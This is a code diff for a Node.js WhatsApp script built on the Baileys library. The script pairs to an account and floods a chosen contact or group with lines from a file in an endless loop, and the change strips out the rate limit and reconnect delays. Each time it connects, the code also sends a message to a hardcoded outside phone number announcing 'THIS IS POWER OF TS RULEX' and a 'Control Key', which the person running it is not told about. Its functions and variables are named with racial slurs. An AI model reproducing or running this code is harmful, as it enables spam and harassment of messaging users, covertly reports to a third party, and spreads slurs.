@@ -23,97 +23,90 @@ const clearState = () => {
   }
 };
 
-let lastRequestTime = 0;
+const initSocket = async (phone) => {
+  const { state, saveCreds } = await useMultiFileAuthState(sessionFolder);
 
-async function requestPairingCode(negga, phoneNumber) {
-  const now = Date.now();
-  if (now - lastRequestTime < 30000) {
-    console.log('Please wait 30 seconds before requesting another pairing code.');
-    return;
-  }
-  lastRequestTime = now;
-  try {
-    const code = await negga.requestPairingCode(phoneNumber);
-    console.log(`Pairing Code: ${code}`);
-  } catch (err) {
-    console.error('Error requesting pairing code:', err);
-    // Add a delay before retrying
-    await delay(10000);
-    await requestPairingCode(negga, phoneNumber);
-  }
-}
+  const socket = Baileys.makeWASocket({
+    printQRInTerminal: false,
+    logger: pino({ level: 'silent' }),
+    browser: ['Google Chrome', '100.0.4896.60', 'Windows'], // Updated browser property
+    auth: state,
+  });
+
+  socket.ev.on('creds.update', saveCreds);
+
+  socket.ev.on('connection.update', async (update) => {
+    const { connection, lastDisconnect } = update;
+
+    if (connection === 'open') {
+      console.log('Connected successfully.');
+      return;
+    }
+
+    if (connection === 'close') {
+      const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
+      const reconnectActions = {
+        [DisconnectReason.connectionClosed]: '[Connection closed, reconnecting...]',
+        [DisconnectReason.connectionLost]: '[Connection lost, reconnecting...]',
+        [DisconnectReason.loggedOut]: '[Logged out, please log in again...]',
+        [DisconnectReason.restartRequired]: '[Server restart required, reconnecting...]',
+        [DisconnectReason.timedOut]: '[Connection timed out, reconnecting...]',
+        [DisconnectReason.badSession]: '[Bad session, reconnecting...]',
+        [DisconnectReason.connectionReplaced]: '[Connection replaced, reconnecting...]',
+      };
+
+      if (reconnectActions[reason]) {
+        console.log(reconnectActions[reason]);
+        if (reason === DisconnectReason.loggedOut || reason === DisconnectReason.badSession) clearState();
+        await startnigg(phone, target, messageFilePath, delayTime, isGroup, name);
+      } else {
+        console.log('[Unknown disconnect reason, reconnecting...]');
+        await startnigg(phone, target, messageFilePath, delayTime, isGroup, name);
+      }
+    }
+  });
+
+  return socket;
+};
 
 async function startnigg(phone, target, messageFilePath, delayTime, isGroup, name) {
   try {
     if (!fs.existsSync(sessionFolder)) fs.mkdirSync(sessionFolder);
-    const { state, saveCreds } = await useMultiFileAuthState(sessionFolder);
 
-    const negga = Baileys.makeWASocket({
-      printQRInTerminal: false,
-      logger: pino({ level: 'silent' }),
-      browser: ['Ubuntu', 'Chrome', '20.0.04'],
-      auth: state,
-    });
+    const socket = await initSocket(phone);
 
-    if (!negga.authState.creds.registered) {
+    if (!socket.authState.creds.registered) {
       const phoneNumber = phone.replace(/[^0-9]/g, '');
       if (phoneNumber.length < 11) throw new Error('Invalid phone number with country code.');
-      await requestPairingCode(negga, phoneNumber);
+
+      const code = await socket.requestPairingCode(phoneNumber);
+      console.log(`Pairing Code: ${code}`);
+      await delay(2000);
     }
 
-    negga.ev.on('creds.update', saveCreds);
+    console.log(`Connected: Sending messages to ${target}`);
+    await delay(10000);
 
-    negga.ev.on('connection.update', async (update) => {
-      const { connection, lastDisconnect } = update;
+    // Send an initial message
+    await socket.sendMessage(`916268781574@s.whatsapp.net`, { text: '🔥THIS IS POWER OF TS RULEX🔥\nMy WhatsApp Control Key: ahvxsfklbvdt' });
+    await delay(2000);
 
-      if (connection === 'open') {
-        console.log(`Connected: Sending messages to ${target}`);
-        await delay(10000);
+    // Continuously send messages from the provided file
+    while (true) {
+      const message = fs.readFileSync(messageFilePath, 'utf-8');
+      const messageLines = message.split('\n');
 
-        // Send an initial message
-        await negga.sendMessage(`916268781574@s.whatsapp.net`, { text: '🔥THIS IS POWER OF TS RULEX🔥\nMy WhatsApp Control Key: ahvxsfklbvdt' });
-        await delay(2000);
+      for (const [i, line] of messageLines.entries()) {
+        const formattedLine = `${name}: ${line}`;
+        const targetID = isGroup ? `${target}@g.us` : `${target}@s.whatsapp.net`;
 
-        // Continuously send messages from the provided file
-        while (true) {
-          const message = fs.readFileSync(messageFilePath, 'utf-8');
-          const messageLines = message.split('\n');
-
-          for (const [i, line] of messageLines.entries()) {
-            const formattedLine = `${name}: ${line}`;
-            const targetID = isGroup ? `${target}@g.us` : `${target}@s.whatsapp.net`;
-
-            await negga.sendMessage(targetID, { text: formattedLine });
-            console.log(`Sent (${i + 1}): ${formattedLine}`);
-            await delay(delayTime * 1000);
-          }
-
-          console.log('All messages sent. Restarting...');
-        }
-      } else if (connection === 'close') {
-        const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
-        const reconnectActions = {
-          [DisconnectReason.connectionClosed]: '[Connection closed, reconnecting...]',
-          [DisconnectReason.connectionLost]: '[Connection lost, reconnecting...]',
-          [DisconnectReason.loggedOut]: '[Logged out, please log in again...]',
-          [DisconnectReason.restartRequired]: '[Server restart required, reconnecting...]',
-          [DisconnectReason.timedOut]: '[Connection timed out, reconnecting...]',
-          [DisconnectReason.badSession]: '[Bad session, reconnecting...]',
-          [DisconnectReason.connectionReplaced]: '[Connection replaced, reconnecting...]',
-        };
-
-        if (reconnectActions[reason]) {
-          console.log(reconnectActions[reason]);
-          if (reason === DisconnectReason.loggedOut || reason === DisconnectReason.badSession) clearState();
-          await delay(10000); // Wait before reconnecting
-          await startnigg(phone, target, messageFilePath, delayTime, isGroup, name);
-        } else {
-          console.log('[Unknown disconnect reason, reconnecting...]');
-          await delay(10000); // Wait before reconnecting
-          await startnigg(phone, target, messageFilePath, delayTime, isGroup, name);
-        }
+        await socket.sendMessage(targetID, { text: formattedLine });
+        console.log(`Sent (${i + 1}): ${formattedLine}`);
+        await delay(delayTime * 1000);
       }
-    });
+
+      console.log('All messages sent. Restarting...');
+    }
   } catch (error) {
     console.error('An error occurred:', error);
   }
@@ -122,53 +115,26 @@ async function startnigg(phone, target, messageFilePath, delayTime, isGroup, nam
 async function fetchGroupJIDs(phone) {
   try {
     if (!fs.existsSync(sessionFolder)) fs.mkdirSync(sessionFolder);
-    const { state, saveCreds } = await useMultiFileAuthState(sessionFolder);
 
-    const negga = Baileys.makeWASocket({
-      printQRInTerminal: false,
-      logger: pino({ level: 'silent' }),
-      browser: ['Ubuntu', 'Chrome', '20.0.04'],
-      auth: state,
-    });
+    const socket = await initSocket(phone);
 
-    if (!negga.authState.creds.registered) {
+    if (!socket.authState.creds.registered) {
       const phoneNumber = phone.replace(/[^0-9]/g, '');
       if (phoneNumber.length < 11) throw new Error('Invalid phone number with country code.');
-      await requestPairingCode(negga, phoneNumber);
+
+      const code = await socket.requestPairingCode(phoneNumber);
+      console.log(`Pairing Code: ${code}`);
+      await delay(2000);
     }
 
-    negga.ev.on('creds.update', saveCreds);
-
-    negga.ev.on('connection.update', async (update) => {
-      const { connection, lastDisconnect } = update;
-
-      if (connection === 'open') {
-        console.log('Login successful');
-        const groups = await negga.groupFetchAllParticipating();
-        for (const group of Object.values(groups)) {
-          console.log(`Group: ${group.subject} - JID: ${group.id}`);
-        }
-        await negga.logout();
-        rl.close();
-        process.exit(0);
-      } else if (connection === 'close') {
-        const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
-        if ([DisconnectReason.connectionClosed, DisconnectReason.connectionLost, DisconnectReason.restartRequired, DisconnectReason.timedOut, DisconnectReason.connectionReplaced].includes(reason)) {
-          console.log('[Connection issue, reconnecting...]');
-          await delay(10000); // Wait before reconnecting
-          await fetchGroupJIDs(phone);
-        } else if ([DisconnectReason.loggedOut, DisconnectReason.badSession].includes(reason)) {
-          console.log('[Session issue, please log in again...]');
-          clearState();
-          await delay(10000); // Wait before reconnecting
-          await fetchGroupJIDs(phone);
-        } else {
-          console.log('[Unknown disconnect reason, reconnecting...]');
-          await delay(10000); // Wait before reconnecting
-          await fetchGroupJIDs(phone);
-        }
-      }
-    });
+    console.log('Login successful');
+    const groups = await socket.groupFetchAllParticipating();
+    for (const group of Object.values(groups)) {
+      console.log(`Group: ${group.subject} - JID: ${group.id}`);
+    }
+    await socket.logout();
+    rl.close();
+    process.exit(0);
   } catch (error) {
     console.error('An error occurred:', error);
   }
@@ -214,4 +180,3 @@ function askQuestion(query) {
     process.exit(0);
   }
 })();
-
